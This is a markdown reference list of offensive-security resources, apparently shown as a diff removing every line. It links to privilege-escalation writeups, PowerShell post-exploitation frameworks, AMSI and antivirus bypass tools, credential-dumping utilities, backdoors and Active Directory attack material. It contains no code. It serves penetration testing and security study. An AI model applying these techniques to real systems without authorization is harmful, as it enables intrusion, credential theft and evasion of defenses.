-* Update ToC so it's accurate
-* sort things into kerberos section
-
-#### CULL
-https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List#escalating
-* [Less is More, Exploring Code/Process-less Techniques and Other Weird Machine Methods to Hide Code (and How to Detect Them)](https://cansecwest.com/slides/2014/less%20is%20more3.pptx)
-* [Shellpaste](https://github.com/andrew-morris/shellpaste)
-	* Tiny snippet of code that pulls ASCII shellcode from pastebin and executes it. The purpose of this is to have a minimal amount of benign code so AV doesn't freak out, then it pulls down the evil stuff. People have been doing this kind of stuff for years so I take no credit for the concept. That being said, this code (or similar code) works surprisingly often during pentests when conventional malware fails.
-* [File Server Triage on Red Team Engagements](http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/)
-* [How to use msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)
-Move to mobile
-* [Untethered initroot (USENIX WOOT '17)](https://alephsecurity.com/2017/08/30/untethered-initroot/)
-#### end sort
-
-
-
-### <a name="general"></a>General
-* [Stegano](https://github.com/cedricbonhomme/Stegano)
-	* Steganography is the art and science of writing hidden messages in such a way that no one, apart from the sender and intended recipient, suspects the existence of the message, a form of security through obscurity. Consequently, functions provided by Stéganô only hide messages, without encryption. Steganography is often used with cryptography.
-* [DotNetToJScript](https://github.com/tyranid/DotNetToJScript)
-	* A tool to create a JScript file which loads a .NET v2 assembly from memory.
-* [Evading Autoruns Kyle Hanslovan Chris Bisnett - DerbyCon 7](https://www.youtube.com/watch?v=AEmuhCwFL5I&app=desktop)
-
-
-
-
-
-
-
-----------------
-### <a name="linpriv">Linux Privilege Escalation</a>
-
-#### Blogposts/Writeups
-* [Dangerous Sudoers Entries – Series, 5 parts](https://blog.compass-security.com/2012/10/dangerous-sudoer-entries-part-1-command-execution/)
-* [No one expect command execution!](http://0x90909090.blogspot.fr/2015/07/no-one-expect-command-execution.html)
-* [Attack and Defend: Linux Privilege Escalation Techniques of 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
-* [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
-* [Using the docker command to root the host (totally not a security issue)](http://reventlov.com/advisories/using-the-docker-command-to-root-the-host)
-	* It is possible to do a few more things more with docker besides working with containers, such as creating a root shell on the host, overwriting system configuration files, reading restricted stuff, etc.
-* [#AVGater: Getting Local Admin by Abusing the Anti-Virus Quarantine](https://bogner.sh/2017/11/avgater-getting-local-admin-by-abusing-the-anti-virus-quarantine/)
-
-#### Talks/Videos
-* [Chw00t: Breaking Unixes’ Chroot Solutions](https://www.youtube.com/watch?v=1A7yJxh-fyc)
-
-
-
-#### Tools
-* [Linux_Exploit_Suggester](https://github.com/PenturaLabs/Linux_Exploit_Suggester)
-	* Linux Exploit Suggester; based on operating system release number.  This program run without arguments will perform a 'uname -r' to grab the Linux Operating Systems release version, and return a suggestive list of possible exploits. Nothing fancy, so a patched/back-ported patch may fool this script.  Additionally possible to provide '-k' flag to manually enter the Kernel Version/Operating System Release Version.
-* [Basic Linux Privilege Escalation - g0tmi1k](http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
-	* Not so much a script as a resource, g0tmi1k’s blog post here has led to so many privilege escalations on Linux system’s it’s not funny. Would definitely recommend trying out everything on this post for enumerating systems.
-* [LinEnum](http://www.rebootuser.com/?p=1758)
-	* This tool is great at running through a heap of things you should check on a Linux system in the post exploit process. This include file permissions, cron jobs if visible, weak credentials etc. The first thing I run on a newly compromised system.
-* [LinuxPrivChecker](http://www.securitysift.com/download/linuxprivchecker.py)
-	* This is a great tool for once again checking a lot of standard things like file permissions etc. The real gem of this script is the recommended privilege escalation exploits given at the conclusion of the script. This is a great starting point for escalation.
-* [Unix Privilege Escalation Checker](https://code.google.com/p/unix-privesc-check/)
-	* Unix-privesc-checker is a script that runs on Unix systems (tested on Solaris 9, HPUX 11, Various Linuxes, FreeBSD 6.2). It tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other users or to access local apps (e.g. databases). It is written as a single shell script so it can be easily uploaded and run (as opposed to un-tarred, compiled and installed). It can run either as a normal user or as root (obviously it does a better job when running as root because it can read more files).
-* [EvilAbigail](https://github.com/GDSSecurity/EvilAbigail/blob/master/README.md)
-	* Initrd encrypted root fs attack
-* [Triple-Fetch-Kernel-Creds](https://github.com/coffeebreakerz/Tripple-Fetch-Kernel-Creds)
-	* Attempt to steal kernelcredentials from launchd + task_t pointer (Based on: CVE-2017-7047)
-
-
-
-
-
-
-
-
-
--------------------
-### <a name="privescwin">Windows Privilege Escalation</a>
-* **Blogposts/Writeups**
-	* [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
-	* [Windows Privilege Escalation Methods for Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
-	* [Common Windows Privilege Escalation Vectors](https://toshellandback.com/2015/11/24/ms-priv-esc/)
-	* [Abusing Token Privileges For LPE - drone/breenmachine](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
-	* [Analyzing local privilege escalations in win32k](http://uninformed.org/?v=all&a=45&t=sumry)
-		* This paper analyzes three vulnerabilities that were found in win32k.sys that allow kernel-mode code execution. The win32k.sys driver is a major component of the GUI subsystem in the Windows operating system. These vulnerabilities have been reported by the author and patched in MS08-025. The first vulnerability is a kernel pool overflow with an old communication mechanism called the Dynamic Data Exchange (DDE) protocol. The second vulnerability involves improper use of the ProbeForWrite function within string management functions. The third vulnerability concerns how win32k handles system menu functions. Their discovery and exploitation are covered. 
-	* [Some forum posts on Win Priv Esc](https://forums.hak5.org/index.php?/topic/26709-windows-7-now-secure/)
-	* [The “SYSTEM” challenge](https://decoder.cloud/2017/02/21/the-system-challenge/)
-		* Writeup of achieving system from limited user privs.
-	* [Windows Privilege Escalation Cheat Sheet/Tricks](http://it-ovid.blogspot.fr/2012/02/windows-privilege-escalation.html)
-	* [Introduction to Logical Privilege Escalation on Windows - James Forshaw](https://conference.hitb.org/hitbsecconf2017ams/materials/D2T3%20-%20James%20Forshaw%20-%20Introduction%20to%20Logical%20Privilege%20Escalation%20on%20Windows.pdf)
-	* [Windows Logical EoP Workbook](https://docs.google.com/document/d/1qujIzDmFrcFCBeIgMjWDZTLNMCAHChAnKDkHdWYEomM/edit)
-	* [Exploiting Windows 2008 Group Policy Preferences](http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html)
-	* [Post Exploitation Using netNTLM Downgrade attacks - Fishnet/Archive.org](https://web.archive.org/web/20131023064257/http://www.fishnetsecurity.com/6labs/blog/post-exploitation-using-netntlm-downgrade-attacks)
-	* [All roads lead to SYSTEM](https://labs.mwrinfosecurity.com/system/assets/760/original/Windows_Services_-_All_roads_lead_to_SYSTEM.pdf)
-	* [Old Privilege Escalation Techniques](http://obscuresecurity.blogspot.com/2011/11/old-privilege-escalation-techniques.html)
-	* [Windows: DCOM DCE/RPC Local NTLM Reflection Elevation of Privilege](https://bugs.chromium.org/p/project-zero/issues/detail?id=325&redir=1)
-	* [How to own any windows network with group policy hijacking attacks](https://labs.mwrinfosecurity.com/blog/2015/04/02/how-to-own-any-windows-network-with-group-policy-hijacking-attacks/)
-	* [The Art of Becoming TrustedInstaller](https://tyranidslair.blogspot.co.uk/2017/08/the-art-of-becoming-trustedinstaller.html)
-		* There's many ways of getting the TI token other than these 3 techniques. For example as Vincent Yiu pointed out on Twitter if you've got easy access to a system token, say using Metasploit's getsystem command you can impersonate system and then open the TI token, it's just IMO less easy :-). If you get a system token with SeTcbPrivilege you can also call LogonUserExExW or LsaLogonUser where you can specify an set of additional groups to apply to a service token. Finally if you get a system token with SeCreateTokenPrivilege (say from LSASS.exe if it's not running PPL) you can craft an arbitrary token using the NtCreateToken system call.
-* **Talks/Videos**
-	* [Hacking windows through the Windows API; delves into windows api, how it can break itself](http://www.irongeek.com/i.php?page=videos/derbycon4/t122-getting-windows-to-play-with-itself-a-pen-testers-guide-to-windows-api-abuse-brady-bloxham)
-	* [BSidesSF 109 Sedating the Watchdog Abusing Security Products to Bypass Windows Protections Tomer Bit](https://www.youtube.com/watch?v=7RKHux8QJfU)
-	* [Black hat talk on Windows Privilege Escalation](http://www.slideshare.net/riyazwalikar/windows-privilege-escalation)
-	* [Level Up! - Practical Windows Privilege Escalation](https://www.slideshare.net/jakx_/level-up-practical-windows-privilege-escalation)
-	* [Extreme Privelege Escalataion on Windows8 UEFI Systems](https://www.youtube.com/watch?v=UJp_rMwdyyI)
-	* [Slides](https://www.blackhat.com/docs/us-14/materials/us-14-Kallenberg-Extreme-Privilege-Escalation-On-Windows8-UEFI-Systems.pdf)
-		* Summary by stormehh from reddit: “In this whitepaper (and accompanying Defcon/Blackhat presentations), the authors demonstrate vulnerabilities in the UEFI "Runtime Service" interface accessible by a privileged userland process on Windows 8. This paper steps through the exploitation process in great detail and demonstrates the ability to obtain code execution in SMM and maintain persistence by means of overwriting SPI flash”
-	* [The Travelling Pentester: Diaries of the Shortest Path to Compromise](https://www.slideshare.net/harmj0y/the-travelling-pentester-diaries-of-the-shortest-path-to-compromise)
-	* [Windows Privilege Escalation -  Riyaz Walikar](https://www.slideshare.net/riyazwalikar/windows-privilege-escalation)
-* **Tools**
-	* [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) 
-		* [Blogpost]https://blog.gdssecurity.com/labs/2014/7/11/introducing-windows-exploit-suggester.html 
-		* This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. 
-	* [PowerUp](https://n0where.net/windows-local-privilege-escalation-powerup/)
-		* Windows Privilege Escalation through Powershell
-	* [ElevateKit](https://github.com/rsmudge/ElevateKit)
-		* The Elevate Kit demonstrates how to use third-party privilege escalation attacks with Cobalt Strike's Beacon payload.
-	* [kernelpop](https://github.com/spencerdodd/kernelpop)
-		* kernel privilege escalation enumeration and exploitation framework
-	* [BeRoot](https://github.com/AlessandroZ/BeRoot)
-	* [Pompem](https://github.com/rfunix/Pompem)
-		* Pompem is an open source tool, designed to automate the search for Exploits and Vulnerability in the most important databases. Developed in Python, has a system of advanced search, that help the work of pentesters and ethical hackers. In the current version, it performs searches in PacketStorm security, CXSecurity, ZeroDay, Vulners, National Vulnerability Database, WPScan Vulnerability Database
-* **Misc Privilege Escalation**
-	* [dtappgather-poc.sh](https://github.com/HackerFantastic/Public/blob/master/exploits/dtappgather-poc.sh)
-		* Exploit PoC reverse engineered from EXTREMEPARR which provides local root on Solaris 7 - 11 (x86 & SPARC). Uses a environment variable of setuid binary dtappgather to manipulate file permissions and create a user owned directory anywhere on the system (as root). Can then add a shared object to locale folder and run setuid binaries with an untrusted library file.
-	* [Privilege Escalation Using Keepnote](http://0xthem.blogspot.com/2014/05/late-night-privilege-escalation-keepup.html)
-
-
-
-
-
-----------------
-### <a name="powershell-stuff">Powershell Things</a>
-**Powershell Things**
-	* [Empire](https://github.com/EmpireProject/Empire)
-		* Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent. It is the merge of the previous PowerShell Empire and Python EmPyre projects. The framework offers cryptologically-secure communications and a flexible architecture. On the PowerShell side, Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework. PowerShell Empire premiered at BSidesLV in 2015 and Python EmPyre premeiered at HackMiami 2016.
-	* [Koadic](https://github.com/zerosum0x0/koadic)
-		* Koadic, or COM Command & Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire. The major difference is that Koadic does most of its operations using Windows Script Host (a.k.a. JScript/VBScript), with compatibility in the core to support a default installation of Windows 2000 with no service packs (and potentially even versions of NT4) all the way through Windows 10.
-	* [Get-Help: An Intro to PowerShell and How to Use it for Evil - Jared Haight](https://www.psattack.com/presentations/get-help-an-intro-to-powershell-and-how-to-use-it-for-evil/)
-	* [PowerOPS: PowerShell for Offensive Operations](https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/)
-		* [PowerOPS Github page](https://github.com/fdiskyou/PowerOPS)
-	* [Client Side attacks using Powershell](http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html)
-	* [Dirty Powershell Webserver](http://obscuresecurity.blogspot.com/2014/05/dirty-powershell-webserver.html)
-	* [Brosec](https://github.com/gabemarshall/Brosec)
-		* Brosec is a terminal based reference utility designed to help us infosec bros and broettes with usefuPowershelll (yet sometimes complex) payloads and commands that are often used during work as infosec practitioners. An example of one of Brosec's most popular use cases is the ability to generate on the fly reverse shells (python, perl, powershell, etc) that get copied to the clipboard.
-	* [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell/tree/master)
-	* [ps1-toolkit](https://github.com/vysec/ps1-toolkit)
-		* This is a set of PowerShell scripts that are used by many penetration testers released by multiple leading professionals. This is simply a collection of scripts that are prepared and obfuscated to reduce level of detectability and to slow down incident response from understanding the actions performed by an attacker.
-* **Awareness**
-	* [Veil-PowerView](https://github.com/Veil-Framework/Veil-PowerView)
-		* Veil-PowerView is a powershell tool to gain network situational awareness on Windows domains. It contains a set of pure-powershell replacements for various windows "net *" commands, which utilize powershell AD hooks and underlying Win32 API functions to perform useful Windows domain functionality.
-	* [PowerShell-AD-Recon](https://github.com/PyroTek3/PowerShell-AD-Recon)
-		* AD PowerShell Recon Scripts
-* **Active Directory**
-	* [Find AD users with empty password using PowerShell](https://4sysops.com/archives/find-ad-users-with-empty-password-passwd_notreqd-flag-using-powershell/)
-	* [LDAPDomainDump](https://github.com/dirkjanm/ldapdomaindump)
-		* In an Active Directory domain, a lot of interesting information can be retrieved via LDAP by any authenticated user (or machine). This makes LDAP an interesting protocol for gathering information in the recon phase of a pentest of an internal network. A problem is that data from LDAP often is not available in an easy to read format. ldapdomaindump is a tool which aims to solve this problem, by collecting and parsing information available via LDAP and outputting it in a human readable HTML format, as well as machine readable json and csv/tsv/greppable files.
-	* [ACLight](https://github.com/cyberark/ACLight)
-		* The tool queries the Active Directory (AD) for its objects' ACLs and then filters and analyzes the sensitive permissions of each one. The result is a list of domain privileged accounts in the network (from the advanced ACLs perspective of the AD). You can run the scan with just any regular user (could be non-privileged user) and it automatically scans all the domains of the scanned network forest.
-	* [MailSniper](https://github.com/dafthack/MailSniper)
-		* MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain. MailSniper also includes additional modules for password spraying, enumerating users/domains, gathering the Global Address List from OWA and EWS, and checking mailbox permissions for every Exchange user at an organization.
-	* [I hunt sys admins 2.0](https://web.archive.org/web/20161101051834/http://www.slideshare.net/harmj0y/i-hunt-sys-admins-20)
-	* [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
-		* Invoke-TheHash contains PowerShell functions for performing pass the hash WMI and SMB tasks. WMI and SMB services are accessed through .NET TCPClient connections. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privilege is not required client-side.
-* **AV Bypass Stuff**
-	* [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
-		* Invoke-Obfuscation is a PowerShell v2.0+ compatible PowerShell command and script obfuscator.
-		* [Presentation](https://www.youtube.com/watch?v=P1lkflnWb0I)
-		* [Invoke-Obfuscation: PowerShell obFUsk8tion Techniques & How To (Try To) D""e`Tec`T 'Th'+'em'](http://www.irongeek.com/i.php?page=videos/derbycon6/121-invoke-obfuscation-powershell-obfusk8tion-techniques-how-to-try-to-detect-them-daniel-bohannon)
-	* [Pulling Back the Curtains on EncodedCommand PowerShell Attacks](https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/)
-	* [Invoke-CradleCrafter: Moar PowerShell obFUsk8tion by Daniel Bohannon](https://www.youtube.com/watch?feature=youtu.be&v=Nn9yJjFGXU0&app=desktop)
-	* [Invoke-CradleCrafter v1.1](https://github.com/danielbohannon/Invoke-CradleCrafter)
-* **Bypass Powershell Restrictions**
-	* **Articles/Videos**
-		* [AMSI: How Windows 10 Plans to Stop Script-Based Attacks and How Well It Does It - Blogpost](http://www.labofapenetrationtester.com/2016/09/amsi.html)
-		* [AMSI: How Windows 10 Plans to Stop Script-Based Attaacks and How Well It Does It - BH US16](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
-		* [15 Ways to bypass Powershell execution-policy settings](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
-			* Does what it says on the tin. Overall, its clear that execution-policy was not meant as a security method. Or if it was, someone was drinking a bit too much.
-		* [PSAmsi - An offensive PowerShell module for interacting with the Anti-Malware Scan Interface in Windows 10](http://www.irongeek.com/i.php?page=videos/derbycon7/t104-psamsi-an-offensive-powershell-module-for-interacting-with-the-anti-malware-scan-interface-in-windows-10-ryan-cobb)
-		* [Bypassing AMSI via COM Server Hijacking](https://posts.specterops.io/bypassing-amsi-via-com-server-hijacking-b8a3354d1aff)
-		* [PowerShell ScriptBlock Logging Bypass](https://cobbr.io/ScriptBlock-Logging-Bypass.html)
-		* [Powershell without Powershell to bypass app whitelist](https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/)
-		* [Empire without PowerShell.exe](https://bneg.io/2017/07/26/empire-without-powershell-exe/)
-	* **Tools**
-		* [PSAmsi](https://github.com/cobbr/PSAmsihttps://github.com/cobbr/PSAmsi)
-			* PSAmsi is a tool for auditing and defeating AMSI signatures.
-		* [nps - Not PowerShell](https://github.com/Ben0xA/nps)
-			* Execute powershell without powershell.exe
-		* [nps_payload](https://github.com/trustedsec/nps_payload)
-			* This script will generate payloads for basic intrusion detection avoidance. It utilizes publicly demonstrated techniques from several different sources. 
-		* [PowerShdll](https://github.com/p3nt4/PowerShdll)
-			* Run PowerShell with rundll32. Bypass software restrictions.
-		* [p0wnedShell](https://github.com/Cn33liz/p0wnedShell)
-			* p0wnedShell is an offensive PowerShell host application written in C# that does not rely on powershell.exe but runs powershell commands and functions within a powershell runspace environment (.NET).	
-* **Dumping/Grabbing Creds**
-	* [PShell Script: Extract All GPO Set Passwords From Domain](http://www.nathanv.com/2012/07/04/pshell-script-extract-all-gpo-set-passwords-from-domain/)
-		* This script parses the domain’s Policies folder looking for Group.xml files.  These files contain either a username change, password setting, or both.  This gives you the raw data for local accounts and/or passwords enforced using Group Policy Preferences.  Microsoft chose to use a static AES key for encrypting this password.  How awesome is that!
-	* [mimikittenz](https://github.com/putterpanda/mimikittenz/)
-		* A post-exploitation powershell tool for extracting juicy info from memory.
-	* [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
-		* Inveigh is a PowerShell LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool designed to assist penetration testers/red teamers that find themselves limited to a Windows system.
-	* [PowerMemory](https://github.com/giMini/PowerMemory)
-		* Exploit the credentials present in files and memory. PowerMemory levers Microsoft signed binaries to hack Microsoft operating systems.
-* **Grabbing Useful files**
-	* [BrowserGatherer](https://github.com/sekirkity/BrowserGather)
-		* Fileless Extraction of Sensitive Browser Information with PowerShell
-	* [SessionGopher](https://github.com/fireeye/SessionGopher)
-		* SessionGopher is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally.
-	* [CC_Checker](https://github.com/NetSPI/PS_CC_Checker)
-		* CC_Checker cracks credit card hashes with PowerShell.
-	* [BrowserGather](https://github.com/sekirkity/BrowserGather)
-		* Fileless Extraction of Sensitive Browser Information with PowerShell. This project will include various cmdlets for extracting credential, history, and cookie/session data from the top 3 most popular web browsers (Chrome, Firefox, and IE). The goal is to perform this extraction entirely in-memory, without touching the disk of the victim. Currently Chrome credential and cookie extraction is supported. 
-* **Malicious X (Document/Macro/whatever) Generation**
-	* [?psWar.py](https://gist.github.com/HarmJ0y/aecabdc30f4c4ef1fad3)
-	* Code that quickly generates a deployable .war for a PowerShell one-liner
-* **Priv Esc / Post Ex Scripts**
-	* [PowerUp](https://github.com/HarmJ0y/PowerUp) 
-		* PowerUp is a powershell tool to assist with local privilege escalation on Windows systems. It contains several methods to identify and abuse vulnerable services, as well as DLL hijacking opportunities, vulnerable registry settings, and escalation opportunities.
-	* [Sherlock](https://github.com/rasta-mouse/Sherlock/blob/master/README.md)
-		* PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.
-	* [JSRat-Py](https://github.com/Hood3dRob1n/JSRat-Py) 
-		* implementation of JSRat.ps1 in Python so you can now run the attack server from any OS instead of being limited to a Windows OS with Powershell enabled
-* **Talks/Videos**
-	* [PowerShell Secrets and Tactics Ben0xA ](https://www.youtube.com/watch?v=mPPv6_adTyg)
-	* [Introducing PowerShell into your Arsenal with PS>Attack - Jared Haight](http://www.irongeek.com/i.php?page=videos/derbycon6/119-introducing-powershell-into-your-arsenal-with-psattack-jared-haight)
-	* [Attacking ADFS Endpoints with PowerShell](http://www.irongeek.com/i.php?page=videos/derbycon6/118-attacking-adfs-endpoints-with-powershell-karl-fosaaen)
-	* [Introducing PS Attack, a portable PowerShell attack toolkit - Jared Haight](https://www.youtube.com/watch?v=lFCtPdUPdHw)
-	* [Offensive Active Directory with Powershell](https://www.youtube.com/watch?v=cXWtu-qalSs)
-	* [Hacking SQL Server on Scale with PowerShell - Secure360 2017](https://www.slideshare.net/nullbind/2017-secure360-hacking-sql-server-on-scale-with-powershell)
-	* [PowerLine](https://github.com/fullmetalcache/powerline)
-		* [Presentation](https://www.youtube.com/watch?v=HiAtkLa8FOc)
-* **Miscellaneous Useful Things** 
-	* [Egress Testing using PowerShell](http://www.labofapenetrationtester.com/2014/04/egress-testing-using-powershell.html)
-	* [PowerShell and Token Impersonation](https://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/)
-	* [Accessing the Windows API in PowerShell via internal .NET methods and reflection](http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html)
-		* It is possible to invoke Windows API function calls via internal .NET native method wrappers in PowerShell without requiring P/Invoke or C# compilation. How is this useful for an attacker? You can call any Windows API function (exported or non-exported) entirely in memory. For those familiar with Metasploit internals, think of this as an analogue to railgun.
-	* [Invoke-DCOM.ps1](https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1)
-	* [Invoke-ProcessScan](https://github.com/vysec/Invoke-ProcessScan)
-		* Gives context to a system. Uses EQGRP shadow broker leaked list to give some descriptions to processes.
-	* [PSReflect](https://github.com/mattifestation/PSReflect)
-		* Easily define in-memory enums, structs, and Win32 functions in PowerShell
-	* [Harness](https://github.com/Rich5/Harness)
-		* Harness is remote access payload with the ability to provide a remote interactive PowerShell interface from a Windows system to virtually any TCP socket. The primary goal of the Harness Project is to provide a remote interface with the same capabilities and overall feel of the native PowerShell executable bundled with the Windows OS.
-	* [Babadook](https://github.com/jseidl/Babadook)
-		* Connection-less Powershell Persistent and Resilient Backdoor
-
------------------
-### <a name="dll"></a>DLL Stuff
-**DLL Stuff**
-	* [rattler](https://github.com/sensepost/rattler)
-		* Rattler is a tool that automates the identification of DLL's which can be used for DLL preloading attacks.
-	* [injectAllTheThings](https://github.com/fdiskyou/injectAllTheThings)
-		* Single Visual Studio project implementing multiple DLL injection techniques (actually 7 different techniques) that work both for 32 and 64 bits. Each technique has its own source code file to make it easy way to read and understand.
-* **DLL Hijacking**
-	* [Dynamic-Link Library Hijacking](https://www.exploit-db.com/docs/31687.pdf)
-	* [Crash Course in DLL Hijacking](https://blog.fortinet.com/2015/12/10/a-crash-course-in-dll-hijacking)
-	* [DLL Injection and Hooking](http://securityxploded.com/dll-injection-and-hooking.php)
-	* [Windows DLL Injection Basics](http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html)
-	* [VB.NET Tutorial - Create a DLL / Class Library](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)
-	* [Calling DLL Functions from Visual Basic Applications - msdn](https://msdn.microsoft.com/en-us/library/dt232c9t.aspx)
-	* [Crash Course in DLL Hijacking](https://blog.fortinet.com/2015/12/10/a-crash-course-in-dll-hijacking)
-	* [Creating a Windows DLL with Visual Basic](http://www.windowsdevcenter.com/pub/a/windows/2005/04/26/create_dll.html)
-* **Group Policy Preferences trick**
-	* [1](http://www.leonteale.co.uk/decrypting-windows-2008-gpp-user-passwords-using-gpprefdecrypt-py/)
-	* [2](http://carnal0wnage.attackresearch.com/2012/10/group-policy-preferences-and-getting.html)
-	* [3](http://blog.securestate.com/how-to-pwn-systems-through-group-policy-preferences/)
-
-
------------------
-### <a name="osxprivesc">Privilege Escalation - OS X</a>
-**OS X Privilege Escalation**
-* [Hidden backdoor API to root privileges in Apple OS X](https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/)
-	* Works on 10.7 -> 10.10.2
-* [Mac OS X local privilege escalation (IOBluetoothFamily)](http://randomthoughts.greyhats.it/2014/10/osx-local-privilege-escalation.html)
-* [Privilege Escalation on OS X below 10.0](https://code.google.com/p/google-security-research/issues/detail?id=121)
-* [Hacking Mac With EmPyre](http://www.disinfosec.com/2016/10/12/hacking-mac/)
-* [osxinj](https://github.com/scen/osxinj)
-	* Another dylib injector. Uses a bootstrapping module since mach_inject doesn't fully emulate library loading and crashes when loading complex modules.
-* [kcap](https://github.com/scriptjunkie/kcap)
-	* This program simply uses screen captures and programmatically generated key and mouse events to locally and graphically man-in-the-middle an OS X password prompt to escalate privileges.
-* [BigPhish](https://github.com/Psychotrope37/bigphish)
-	* This issue has been resolved by Apple in MacOS Sierra by enabling tty_tickets by default. NOTE: All other MacOS operation system (El Capitan, Yosemite, Mavericks etc...) still remain vulnerable to this exploit.
-
-
-
-
--------------------
-### General Post Exploitation
-* [Adversarial Post Ex - Lessons from the Pros](https://www.slideshare.net/sixdub/adversarial-post-ex-lessons-from-the-pros)
-* [portia](https://github.com/SpiderLabs/portia)
-	* Portia aims to automate a number of techniques commonly performed on internal network penetration tests after a low privileged account has been compromised.
-* [Meta-Post Exploitation - Using Old, Lost, Forgotten Knowledge](https://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf)
-* [dvcs-ripper](https://github.com/kost/dvcs-ripper)
-	* Rip web accessible (distributed) version control systems: SVN, GIT, Mercurial/hg, bzr, ... It can rip repositories even when directory browsing is turned off.
--------------------
-### <a name="linpost">Post-Exploitation Linux</a>
-**Post-Exploitation Linux**
-* [More on Using Bash's Built-in /dev/tcp File (TCP/IP)](http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip More on Using Bash's Built-in /dev/tcp File (TCP/IP))
-
-
-
-
-------------
-### <a name="winpost">Post-Exploitation Windows</a>
-**Post-Exploitation Windows**
-* [Dumping user passwords in plaintext on Windows 8.1 and Server 2012](http://www.labofapenetrationtester.com/2015/05/dumping-passwords-in-plain-on-windows-8-1.html)
-* [Post-Exploitation on Windows using ActiveX Controls](http://uninformed.org/?v=all&a=3&t=sumry)
-* [WMI Shell Tool](https://github.com/secabstraction/Create-WMIshell)
-	* The WMI shell tool that we have developed allows us to execute commands and get their output using only the WMI infrastructure, without any help from other services, like the SMB server. With the wmi-shell tool we can execute commands, upload files and recover Windows passwords remotely using only the WMI service available on port 135.
-* [Windows - Application Shims](https://technet.microsoft.com/en-us/library/dd837644%28v=ws.10%29.aspx)
-* [WMIcmd](https://github.com/nccgroup/WMIcmd)
-	* A command shell wrapper using only WMI for Microsoft Windows
-* [Windows Driver and Service enumeration with Python](https://cybersyndicates.com/2015/09/windows-driver-and-service-enumeration-with-python/)
-* [Post Exploitation Persistence With Application Shims (Intro)](http://blacksunhackers.club/2016/08/post-exploitation-persistence-with-application-shims-intro/)
-* [Shimming for Post Exploitation(blog)](http://www.sdb.tools/)
-* [Hiding Files by Exploiting Spaces in Windows Paths](http://blakhal0.blogspot.com/2012/08/hiding-files-by-exploiting-spaces-in.html)
-
-
-------------
-### <a name="ad"></a>Active Directory
-**Active Directory**
-* [What is Active Directory Domain Services and how does it work?](https://serverfault.com/questions/402580/what-is-active-directory-domain-services-and-how-does-it-work#)
-* [5 Ways to Find Systems Running Domain Admin Processes](https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/)
-* Blogposts/Writeups
-	* [How To Pass the Ticket Through SSH Tunnels](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)
-	* [Accessing Internal Fileshares through Exchange ActiveSync](https://labs.mwrinfosecurity.com/blog/accessing-internal-fileshares-through-exchange-activesync)
-	* [Pen Testing Active Directory Series](https://blog.varonis.com/binge-read-pen-testing-active-directory-series/)
-	* [How Attackers Dump Active Directory Database Credentials](https://adsecurity.org/?p=2398)
-	* [Nodal Analysis of Domain Trusts – Maximizing the Win!](http://www.sixdub.net/?p=285)
-	* [Derivative Local Admin](https://web.archive.org/web/20170606071124/https://www.sixdub.net/?p=591)
-	* [Faster Domain Escalation using LDAP ](https://blog.netspi.com/faster-domain-escalation-using-ldap/)
-	* [Abusing DNSAdmins privilege for escalation in Active Directory](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
